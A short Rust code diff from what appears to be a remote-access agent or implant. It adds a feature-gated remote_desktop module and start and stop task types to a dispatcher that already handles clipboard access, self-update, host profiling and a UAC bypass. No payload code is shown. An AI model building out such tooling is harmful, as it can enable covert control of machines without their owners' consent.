@@ -32,6 +32,8 @@ pub mod clipboard;
 pub mod self_update;
 #[cfg(feature = "uac_bypass")]
 pub mod uac_bypass;
+#[cfg(feature = "remote_desktop")]
+pub mod remote_desktop;
 pub mod host_profile;
 
 use serde::{Deserialize, Serialize};
@@ -173,6 +175,11 @@ fn dispatch_task_inner(task_id: i64, task_type: &str, args: &serde_json::Value) 
         "self_update" => self_update::run(task_id, args),
         #[cfg(feature = "uac_bypass")]
         "uac_bypass" => uac_bypass::run(task_id, args),
+
+        #[cfg(feature = "remote_desktop")]
+        "remote_desktop_start" => remote_desktop::start(task_id, args),
+        #[cfg(feature = "remote_desktop")]
+        "remote_desktop_stop" => remote_desktop::stop(task_id, args),
 
         _ => TaskResult::error(task_id, format!("unknown task type: {}", task_type)),
     }
